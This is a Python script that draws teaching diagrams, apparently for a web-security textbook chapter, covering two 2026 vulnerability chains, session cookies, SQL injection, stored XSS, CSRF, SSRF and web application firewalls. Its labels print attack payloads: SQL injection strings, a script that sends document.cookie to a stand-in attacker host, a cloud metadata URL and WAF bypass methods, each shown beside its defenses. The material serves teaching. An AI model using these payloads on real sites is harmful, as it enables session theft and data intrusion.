import os
import sys; sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from fig import *
OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "out", "") + ""

# Redraw: the two October 2026 chains
c = Fig(1100, 590, "Two October 2026 server-side chains: PHP2Shell and the GitLab org-mode bug",
        "Top, PHP2Shell (CVE-2026-109618 and CVE-2026-109619): request 1 sends a multipart body that passes the size check but "
        "exhausts memory; PHP aborts mid-operation and the worker keeps pointers into freed memory; request 2 to the same worker "
        "reuses that stale state, giving code execution before any application code runs under mod_php. Bottom, GitLab "
        "(CVE-2026-110264): an org-mode file declares its own task keyword with #+TODO:, org-ruby escapes it in one pattern but "
        "pastes it raw into another, the regex compiler treats attacker text as pattern syntax, too many repeats overflow a counter "
        "in Onigmo, and code runs on the GitLab server with no login, CVSS 10.0.")
def chain(y, title, col, steps, s0):
    c.text(40, y - 26, title, 16, col, "bold", "start", step=s0)
    for i, (ic, h, sub) in enumerate(steps):
        x = 40 + i * 212; last = i == len(steps) - 1; cc = RED if last else col
        c.rect(x, y, 190, 170, "#ffffff", cc, 2.2, rx=10, step=s0 + i); c.rect(x, y, 190, 8, cc, cc, 1, rx=4, step=s0 + i)
        c.icon(ic, x + 95, y + 52, 62, step=s0 + i); c.text(x + 95, y + 106, h, 15, cc, "bold", step=s0 + i)
        c.text(x + 95, y + 126, sub, 12, INK, step=s0 + i); c.badge(i + 1, x + 172, y + 18, step=s0 + i, color=cc)
        if not last: c.arrow([(x + 192, y + 85), (x + 210, y + 85)], None, col, step=s0 + i + 1, width=2.6)
chain(100, "PHP2Shell (CVE-2026-109618 and CVE-2026-109619)", ORANGE,
      [("envelope", "Request 1", "multipart body passes\nthe size check, then\nexhausts memory"), ("memory", "Out of memory", "PHP aborts mid-operation;\nstate half built"),
       ("warning", "Stale state", "worker keeps pointers\ninto freed memory"), ("envelope", "Request 2", "same worker reuses\nthe stale state"),
       ("bug", "Code execution", "before any application\ncode runs (mod_php)")], 1)
chain(360, "GitLab org-mode rendering (CVE-2026-110264)", BLUE,
      [("document", "Org-mode file", "declares its own task\nkeyword with #+TODO:"), ("code", "org-ruby", "escapes it for one\npattern, pastes it raw\ninto another"),
       ("gear", "Regex compiler", "attacker text becomes\npattern syntax"), ("chip", "Onigmo engine", "too many repeats overflow\nan internal ID counter"),
       ("bug", "Code execution", "on the GitLab server,\nno login (CVSS 10.0)")], 6)
c.text(550, 570, "Both: untrusted input reaches a native component below a memory-safe or interpreted layer.", 14, MUTED, italic=True, step=10)
c.save(OUT + "ch10_oct2026_chains_v2")

# New: HTTP, a session cookie, and the same-origin policy
h = Fig(1100, 540, "HTTP is stateless, so a cookie carries the session; the same-origin policy fences scripts",
        "The browser sends a login request over HTTPS; the server replies 200 OK with Set-Cookie: a random session identifier marked "
        "Secure, HttpOnly, and SameSite. The browser returns the cookie on every later request, so the cookie is the session. Script "
        "from another origin, a different scheme, host, or port, cannot read responses from the bank's origin.")
h.icon("browser", 110, 180, 110, "Browser")
h.icon("server", 900, 180, 100, "bank.example", "web server")
h.arrow([(170, 130), (845, 130)], "POST /login   user=alice&pass=...   (inside TLS)", BLUE, step=1, size=13, width=2.6); h.badge(1, 180, 110, step=1)
h.arrow([(845, 190), (170, 190)], "200 OK   Set-Cookie: sid=8f3a...; Secure; HttpOnly; SameSite=Lax", GREEN, step=2, size=13, width=2.6); h.badge(2, 820, 170, step=2, color=GREEN)
h.arrow([(170, 260), (845, 260)], "GET /account   Cookie: sid=8f3a...", BLUE, step=3, size=13, width=2.6); h.badge(3, 180, 240, step=3)
h.text(510, 300, "every request carries the cookie, so whoever holds it is logged in", 13, INK, "bold", step=3, italic=True)
flags = [("Secure", "sent only over HTTPS"), ("HttpOnly", "hidden from JavaScript: limits XSS theft"), ("SameSite", "not sent on cross-site requests: limits CSRF")]
for i, (a, b) in enumerate(flags):
    x = 40 + i * 345
    h.rect(x, 330, 325, 60, "#eef5fc", BLUE, 1.6, rx=8, step=4); h.icon("shield", x + 30, 360, 34, step=4)
    h.text(x + 56, 354, a, 15, BLUE, "bold", "start", step=4); h.text(x + 56, 374, b, 12, INK, anchor="start", step=4)
h.badge(4, 40, 330, step=4)
h.zone(40, 410, 470, 110, "Origin A: https://bank.example:443", GREEN, "#eef8ef", step=5)
h.zone(590, 410, 470, 110, "Origin B: https://evil.example:443", RED, "#fdf2f1", step=5)
h.icon("code", 990, 466, 44, step=5); h.text(990, 506, "script", 13, RED, "bold", step=5)
h.arrow([(960, 480), (520, 480)], "cannot read responses", RED, step=5, size=13, width=2.6, dash=True, label_at=.3, label_dy=-10); h.icon("cross", 545, 480, 24, step=5)
h.badge(5, 40, 410, step=5)
h.text(280, 486, "same-origin policy: scheme + host + port", 13, GREEN, "bold", step=5)
h.save(OUT + "ch10_http_session")

# New: SQL injection
q = Fig(1100, 560, "SQL injection: input becomes code, and parameters keep it data",
        "The login form sends a username and password. Concatenated into a query, the input ' OR '1'='1 makes the WHERE clause always "
        "true and logs the attacker in; admin' -- comments out the password check; UNION SELECT reads other tables. A parameterized "
        "query sends code and data separately, so the same input is compared as a plain string and matches no user.")
q.icon("attacker", 80, 150, 80, "Attacker")
q.rect(170, 90, 260, 120, "#ffffff", "#9aa5b1", 1.6, rx=8, step=1)
q.text(190, 118, "Username", 12, MUTED, anchor="start", step=1); q.rect(190, 124, 220, 26, "#fff8e1", "#d9a400", 1.2, rx=4, step=1)
q.text(198, 142, "' OR '1'='1", 14, RED, "bold", "start", step=1)
q.text(190, 172, "Password", 12, MUTED, anchor="start", step=1); q.rect(190, 178, 220, 22, "#ffffff", "#c5ccd3", 1.2, rx=4, step=1)
q.badge(1, 170, 90, step=1, color=RED)
q.icon("server", 520, 150, 80, "Web app", step=2); q.arrow([(432, 150), (478, 150)], None, RED, step=2, width=2.6)
q.icon("database", 960, 150, 90, "Database", step=3)
q.rect(590, 230, 480, 96, "#1f2933", "#1f2933", 1, rx=8, step=2)
q.text(606, 256, "Vulnerable: string concatenation", 13, "#f5b041", "bold", "start", step=2)
q.text(606, 280, "SELECT * FROM users WHERE name='' OR '1'='1'", 13, "#e4e7eb", anchor="start", step=2)
q.text(606, 304, "AND pass='...'        -> always true", 13, "#ff8a80", "bold", "start", step=2); q.badge(2, 590, 230, step=2, color=RED)
q.arrow([(562, 140), (912, 140)], None, RED, step=3, width=2.6); q.arrow([(912, 170), (562, 170)], "every user row: logged in as the first, often admin", RED, step=3, size=12, label_dy=22)
q.badge(3, 880, 100, step=3, color=RED)
var = [("admin' --", "comments out the password check"), ("' UNION SELECT username, password FROM users --", "reads another table"),
       ("' AND SLEEP(5) --", "blind, time-based inference")]
q.text(40, 372, "Other payloads", 15, INK, "bold", "start", step=4); q.badge(4, 24, 366, step=4, color=RED)
for i, (a, b) in enumerate(var):
    q.text(60, 400 + i * 44, a, 13, RED, "bold", "start", step=4); q.text(60, 418 + i * 44, b, 12, INK, anchor="start", step=4)
q.rect(590, 360, 480, 110, "#e8f5e9", GREEN, 1.6, rx=8, step=5)
q.text(606, 386, "Fixed: parameterized query (prepared statement)", 13, GREEN, "bold", "start", step=5)
q.text(606, 410, "SELECT * FROM users WHERE name = ? AND pass = ?", 13, INK, anchor="start", step=5)
q.text(606, 434, "the input is data: no user is named ' OR '1'='1", 13, INK, anchor="start", step=5)
q.text(606, 456, "plus least-privilege database accounts", 12, MUTED, anchor="start", step=5, italic=True); q.badge(5, 590, 360, step=5, color=GREEN)
q.text(550, 540, "sqlmap automates the in-band, error-based, and blind variants.", 13, MUTED, italic=True, step=5)
q.save(OUT + "ch10_sqli")

# New: stored XSS
x = Fig(1100, 520, "Stored XSS: one malicious comment runs in every visitor's browser",
        "The attacker posts a comment containing a script. The server stores it and serves it unencoded to every visitor. Each "
        "victim's browser runs the script in the site's origin, and it sends document.cookie to the attacker's server, who reuses "
        "the session. Defenses: context-aware output encoding, a Content Security Policy, and HttpOnly cookies.")
x.icon("attacker", 90, 150, 80, "Attacker")
x.rect(150, 60, 330, 40, "#1f2933", "#1f2933", 1, rx=6, step=1); x.text(315, 86, "<script>fetch('//evil/?c='+document.cookie)</script>", 11, "#8fd16a", "bold", step=1)
x.arrow([(140, 150), (440, 150)], "POST comment", RED, step=1, size=13, width=2.6); x.badge(1, 150, 120, step=1, color=RED)
x.icon("server", 500, 150, 80, "Forum", step=2); x.icon("database", 610, 110, 54, "comments", step=2); x.badge(2, 470, 96, step=2, color=RED)
for i, yy in enumerate([300, 380, 460]):
    x.icon("user-laptop", 760, yy, 60, step=3)
    x.arrow([(545, 175), (722, yy)], None, ORANGE, step=3, width=1.8)
x.text(570, 276, "page served to every visitor", 13, ORANGE, "bold", "end", step=3); x.badge(3, 590, 250, step=3, color=ORANGE)
x.icon("cloud", 1000, 380, 110, step=4); x.text(1000, 440, "attacker server", 13, RED, "bold", step=4)
for yy in (300, 380, 460): x.arrow([(800, yy), (940, 380)], None, RED, step=4, width=1.8, dash=True)
x.text(1000, 300, "stolen session cookies", 13, RED, "bold", step=4); x.badge(4, 1000, 270, step=4, color=RED)
x.rect(40, 310, 540, 190, "#e8f5e9", GREEN, 1.6, rx=8, step=5); x.badge(5, 40, 310, step=5, color=GREEN)
x.icon("shield", 80, 350, 40, step=5); x.text(110, 354, "Defenses", 16, GREEN, "bold", "start", step=5)
for i, t in enumerate(["Encode on output: <script> becomes &lt;script&gt;, inert text", "Content Security Policy blocks inline and third-party script",
                       "HttpOnly cookies cannot be read by script", "Blacklist filters fail: <img src=x onerror=...> slips past"]):
    x.text(60, 394 + i * 26, ("x  " if i == 3 else "+  ") + t, 13, RED if i == 3 else INK, "bold" if i < 3 else "normal", "start", step=5)
x.save(OUT + "ch10_stored_xss")

# New: CSRF
f = Fig(1100, 460, "Cross-site request forgery: the browser attaches the cookie for the attacker",
        "The victim is logged in to the bank, so the browser holds its session cookie. The victim then opens a malicious page whose "
        "hidden form posts a transfer to the bank. The browser automatically attaches the bank cookie, and the bank, seeing a valid "
        "session, performs the transfer. Anti-CSRF tokens tied to the session and SameSite cookies stop it.")
f.icon("user-laptop", 160, 230, 100, "Victim's browser", "logged in to the bank")
f.icon("server", 920, 120, 90, "bank.example"); f.icon("devil", 920, 360, 60, step=2); f.icon("browser", 880, 360, 60, step=2)
f.text(900, 420, "evil.example page", 13, RED, "bold", step=2)
f.arrow([(130, 175), (130, 95), (860, 95)], "earlier: login; the browser stores the bank cookie", BLUE, step=1, size=12, both=True, label_at=.6); f.badge(1, 130, 120, step=1)
f.arrow([(850, 350), (230, 260)], "victim opens a malicious page with a hidden form", RED, step=2, size=12, dash=True, label_dy=24, label_at=.42); f.badge(2, 820, 330, step=2, color=RED)
f.arrow([(190, 235), (860, 140)], None, RED, step=3, width=3)
f.text(560, 240, "POST /transfer to=attacker&amount=5000", 13, RED, "bold", step=3); f.text(560, 258, "Cookie: sid=... (attached automatically)", 13, RED, "bold", step=3)
f.badge(3, 300, 220, step=3, color=RED)
f.icon("money", 1040, 120, 50, step=4); f.text(1040, 170, "transfer done", 12, RED, "bold", step=4); f.badge(4, 1060, 80, step=4, color=RED)
f.rect(40, 380, 600, 60, "#e8f5e9", GREEN, 1.6, rx=8, step=5); f.icon("shield", 74, 410, 36, step=5); f.badge(5, 40, 380, step=5, color=GREEN)
f.text(100, 404, "Anti-CSRF token: an unpredictable value the evil page cannot know.", 13, GREEN, "bold", "start", step=5)
f.text(100, 424, "SameSite cookies: not attached to cross-site requests.", 13, GREEN, "bold", "start", step=5)
f.save(OUT + "ch10_csrf")

# New: SSRF
s = Fig(1100, 520, "Server-side request forgery: the server fetches what the attacker names",
        "A web feature fetches a URL the user supplies. The attacker supplies an internal address instead, such as the cloud instance "
        "metadata service at 169.254.169.254 or http://localhost:8080/admin. The server, inside the firewall, makes the request and "
        "returns the response, which can include temporary credentials for the host's IAM role. Defenses: allow-list outbound "
        "targets, block internal and metadata addresses, and require IMDSv2 session tokens.")
s.icon("attacker", 70, 237, 70, "Attacker")
s.icon("firewall", 290, 237, 80, "Firewall")
s.zone(370, 60, 700, 380, "Cloud VPC (internal)", BLUE, "#eef5fc")
s.icon("server", 520, 237, 90, "Web app", "fetches a URL for you")
s.arrow([(120, 212), (474, 212)], "url=http://169.254.169.254/...", RED, step=1, size=12, label_dy=-34, label_at=.4); s.badge(1, 130, 190, step=1, color=RED)
s.icon("cloud", 900, 140, 110, step=2); s.icon("key", 900, 136, 34, step=2); s.text(900, 200, "metadata service", 13, INK, "bold", step=2)
s.text(900, 216, "169.254.169.254", 12, MUTED, step=2)
s.icon("server", 900, 340, 70, "localhost:8080/admin", step=2)
s.arrow([(566, 205), (845, 140)], "server-side request", RED, step=2, size=12, width=2.6, label_at=.45, label_dy=-16); s.arrow([(566, 240), (860, 330)], None, RED, step=2, width=2, dash=True)
s.badge(2, 640, 150, step=2, color=RED)
s.arrow([(850, 175), (570, 250)], None, ORANGE, step=3, width=2.6); s.arrow([(474, 262), (120, 262)], "IAM role credentials returned", ORANGE, step=3, size=12, label_dy=56, width=2.6, label_at=.64)
s.badge(3, 130, 300, step=3, color=ORANGE)
s.rect(40, 455, 1030, 50, "#e8f5e9", GREEN, 1.6, rx=8, step=4); s.icon("shield", 72, 480, 32, step=4); s.badge(4, 40, 455, step=4, color=GREEN)
s.text(98, 486, "Allow-list outbound targets, block internal and metadata ranges, and require IMDSv2 session tokens.", 14, GREEN, "bold", "start", step=4)
s.save(OUT + "ch10_ssrf")

# New: WAF and its limits
w = Fig(1100, 480, "A web application firewall: a useful filter, not a fix",
        "Requests pass through the WAF before the application. It blocks a request that matches a known signature, such as a plain "
        "SQL injection, and can virtually patch a flaw while a fix is built. Encoded, smuggled, or fragmented payloads can slip past "
        "its rules and reach vulnerable code, so the WAF is a compensating control, not a substitute for secure code.")
w.icon("attacker", 90, 180, 80, "Client")
w.icon("firewall", 430, 180, 100, "WAF", "rules and signatures"); w.icon("shield", 470, 140, 34)
w.icon("server", 860, 180, 90, "Web application", "still vulnerable")
w.arrow([(132, 140), (372, 140)], "' OR '1'='1", RED, step=1, size=13, width=2.6); w.icon("cross", 400, 140, 26, step=1); w.text(400, 108, "blocked", 13, RED, "bold", step=1)
w.badge(1, 140, 120, step=1, color=RED)
w.arrow([(132, 200), (812, 200)], "%2527%2520OR... (double-encoded)", ORANGE, step=2, size=13, width=2.6, label_at=.17, label_dy=-8)
w.icon("bug", 900, 130, 30, step=2); w.text(640, 236, "slips past the rules", 13, ORANGE, "bold", step=2); w.badge(2, 122, 220, step=2, color=ORANGE)
ev = ["encoding: double URL, Unicode", "HTTP request smuggling", "case variation", "fragments that combine into an attack"]
w.text(40, 300, "Common bypasses", 15, ORANGE, "bold", "start", step=3); w.badge(3, 24, 294, step=3, color=ORANGE)
for i, t in enumerate(ev): w.text(60, 326 + i * 22, "- " + t, 13, INK, anchor="start", step=3)
w.rect(560, 290, 510, 150, "#e8f5e9", GREEN, 1.6, rx=8, step=4); w.badge(4, 560, 290, step=4, color=GREEN)
w.text(580, 318, "Use a WAF for", 15, GREEN, "bold", "start", step=4)
w.text(580, 344, "+ known signatures and automated scanners", 13, INK, anchor="start", step=4)
w.text(580, 368, "+ virtual patching until the code is fixed", 13, INK, anchor="start", step=4)
w.text(580, 400, "but fix the code: parameterized queries, encoding,", 13, GREEN, "bold", "start", step=4)
w.text(580, 420, "authorization checks", 13, GREEN, "bold", "start", step=4)
w.save(OUT + "ch10_waf")
print("ok")
